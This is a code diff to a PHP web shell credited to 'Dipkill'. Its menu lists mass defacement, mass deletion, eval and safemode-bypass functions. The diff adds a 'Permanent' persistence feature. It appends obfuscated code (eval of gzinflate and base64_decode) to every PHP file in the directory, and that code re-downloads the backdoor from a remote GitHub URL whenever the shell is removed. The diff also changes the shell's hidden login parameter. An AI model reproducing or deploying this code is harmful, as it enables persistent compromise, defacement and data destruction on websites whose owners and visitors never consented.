@@ -21,7 +21,7 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 }
 function login_shell() {
 
-if ($_GET["login"] == "bro"){
+if ($_GET["log"] == "in"){
     echo "<form method='post'>
 
 <center>
@@ -384,11 +384,13 @@ echo "<ul>
 <li><a class='head' href='?act=mass'>[ Mass Deface ]</a></li>
 <li><a class='head' href='?act=socket'>[ Socket Server ]</a></li>
 <br><br>
+<li><a class='head' href='?act=permanent'>[ Permanent ]</a></li>
 <li><a class='head' href='?act=massdelete'>[ Mass Delete ]</a></li>
 <li><a class='head' href='?act=symlink'>[ Symlink ]</a></li>
 <li><a class='head' href='?act=jumping'>[ Jumping ]</a></li>
 <li><a class='head' href='?act=eval'>[ Eval ]</a></li>
 <li><a class='head' href='?act=byfunct'>[ Bypass function and safemode ]</a></li>
+<br><br>
 <li><a class='head' href='?act=logout'>[ Logout ]</a></li>
 </b></center>
 </ul><br>";
@@ -838,6 +840,28 @@ elseif ($_GET["act"] == "socket"){
     }
     socket_close($sock);}
 }
+if ($_GET['act'] == 'permanent'){
+    $self = $_SERVER['PHP_SELF'];
+    $nama = substr($self,1);
+    $isi = scandir(halaman());
+    $str = "
+if (!file_exists('$nama')){
+\$backdoor = file_get_contents('https://raw.githubusercontent.com/Dipkill/Dipkill-shell/master/encode.php');
+    \$fp = fopen('$nama','w');
+    fwrite(\$fp,\$backdoor);
+    fclose(\$fp);
+}";
+    foreach($isi as $data){
+        
+        if (strstr($data,".php")){
+            $fp = fopen($data,'a+');
+            $gz = gzdeflate($str);
+            $base64 = base64_encode($gz);
+            fwrite($fp,"<?php eval(gzinflate(base64_decode('".$base64."')));?>");
+            fclose($fp);
+    }    
+  }
+}
     if ($_GET["act"] == "phpinfo") echo phpinfo();
 echo "<br><br><b><center>
 Copyright &copy;".shell_color("2018 Dipkill")." • ".shell_color("Clown Hacktivism")."</center></b>";
@@ -845,19 +869,3 @@ Copyright &copy;".shell_color("2018 Dipkill")." • ".shell_color("Clown Hacktiv
 echo "</body>
 </html>";
 ?>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
